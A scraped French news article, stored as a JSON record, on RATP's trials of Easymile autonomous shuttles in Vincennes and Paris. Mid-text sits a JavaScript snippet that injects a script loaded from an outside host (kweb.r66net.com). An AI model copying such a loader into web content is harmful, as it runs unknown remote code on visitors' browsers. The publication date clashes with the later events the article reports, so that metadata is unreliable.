{"title": "La RATP teste des navettes autonomes dans le bois de Vincennes", "newspaper": "Futura Sciences", "author": "Par Futura avec l'AFP", "date_publi": "24/01/2017", "content": "Depuis quelques jours, la RATP et le constructeur Easymile testent un service de navette autonome dans la capitale pour relier le bois de Vincennes à la station de métro Château de Vincennes. Deux navettes autonomes du constructeur français Easymile sont testées depuis vendredi dernier par la  RATP , Île-de-France Mobilités (ex Stif) et la ville de Paris, pour relier le  bois  de Vincennes à la station de métro Château de Vincennes. Ces minibus qui proposent six places assises transporteront gratuitement les passagers du vendredi au dimanche, pendant six mois au moins, entre la station Château de Vincennes (ligne 1) et le parc floral de Paris, avec un arrêt intermédiaire au Fort Neuf de Vincennes, détaille un communiqué de presse. Ces navettes 100 % électriques seront rechargées la nuit. Le communiqué précise qu'un «  nouveau mode d'exploitation  », en convoi, sera également testé : «  Afin de répondre aux pics d'affluence, les navettes autonomes seront accolées les unes aux autres pour circuler de manière très rapprochée. L'objectif à terme est de pouvoir opérer un nombre de navettes autonomes adapté à l'affluence de passagers  ».  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Bientôt une desserte du site du CEA Paris-Saclay Dans les semaines à venir, le groupe RATP lancera une desserte interne du site du CEA Paris-Saclay avec deux autres navettes autonomes. Des navettes  Navya  (un autre constructeur français), opérées par Transdev, transportent déjà les salariés de la centrale EDF de Civaux (Vienne). Les opérateurs de transports envisagent d'utiliser ces navettes autonomes notamment pour desservir des zones peu denses, dans lesquelles il n'est pas économiquement viable de faire circuler des bus. Elles deviendront alors des minibus qui transporteront à la demande les usagers. La ministre des Transports Elisabeth Borne a inscrit le sujet au menu des  Assises de la mobilité , qui se tiennent jusqu'en décembre et doivent aboutir à la présentation, début 2018, d'un projet de loi d'orientation des mobilités. Des navettes autonomes sont expérimentées un peu partout dans le monde. En France, la navette Easymile avait déjà été testée par la RATP entre les gares de Lyon et d'Austerlitz (voir article ci-dessous) et avait transporté 30.000 voyageurs. Celles de Navya sont expérimentées dans le quartier d'affaires de La Défense, à l'ouest de Paris, par la région Île-de-France et Keolis (filiale de la SNCF). Cette dernière les avait déjà testées à Lyon, dans le quartier de Confluence. Dernière annonce en date : l'opérateur Transdev et le constructeur Lohr ont présenté mardi la navette  i-Cristal , développée dans le cadre d'un partenariat et qui sera disponible à partir de septembre 2018. Une  navette Navya , opérée par Keolis, a récemment été impliquée dans une collision sans gravité avec un camion de livraison, reconnu responsable, à Las Vegas (États-Unis). Pour en savoir plus La RATP teste des navettes autonomes dans Paris Article initial de Marc Zaffagni, paru le 24/01/2017 La RATP a débuté une expérimentation dans la capitale avec des navettes électriques autonomes qui circulent entre les gares de Lyon et d'Austerlitz via le pont Charles de Gaulle. L'objectif principal est de recueillir l'avis des usagers sur ce type de service. Après Lyon en septembre dernier avec le minibus électrique  Navya , Paris accueille à son tour des navettes électriques autonomes. La RATP, en partenariat avec la Ville de Paris et le Stif (Syndicat des transports en Ile-de-France), vient d'engager un essai en conditions réelles. Depuis hier et jusqu'au 7 avril, deux  navettes électriques EZ10  fabriquées par le français  Easymile  vont circuler entre les gares d'Austerlitz et de Lyon, en empruntant une voie spécialement aménagée sur le pont Charles de Gaulle situé dans le douzième arrondissement de la capitale. D'une capacité de six places, ces navettes EZ10 sans chauffeur seront accessibles gratuitement, 7 jours sur 7 entre 14 heures et 20 heures. Un agent sera présent à bord pour pouvoir intervenir en cas de dysfonctionnement. Pour la RATP, l'objectif premier de cette expérimentation est de recueillir le sentiment des usagers sur ce concept et les pistes d'amélioration. La régie de transport indique par ailleurs qu'elle collectera des informations sur les performances, la fiabilité et la sécurité du système. La RATP travaille sur un « garage intelligent » D'autres essais de ce type sont prévus courant 2017, avec notamment une liaison par navette électrique autonome entre le Château de Vincennes et le Parc floral du bois de Vincennes. La RATP a également prévu d'instaurer un service sur le site du Centre CEA de Saclay.  Parallèlement à ce projet de  transport autonome  100 % électrique, la RATP a révélé qu'elle planche sur un concept de «  garage  intelligent » pour ses bus. L'idée est de trouver le moyen d'optimiser la circulation des véhicules dans les centres-bus situés dans des zones urbaines denses. Pour cela, il s'agira de développer un système de stationnement autonome grâce auquel les  bus  iront se garer eux-mêmes. Des essais seront menés dans le centre-bus de Lagny (vingtième arrondissement). Navya, le premier véhicule autonome et électrique disponible à la vente                       Alors que des entreprises américaines comme Google ou Tesla travaillent sur des véhicules électriques et autonomes, l’entreprise française Navya propose déjà son modèle à la vente. Déployé dans la centrale nucléaire de Civaux, le voici présenté en vidéo.                                       ", "theme": "tech"}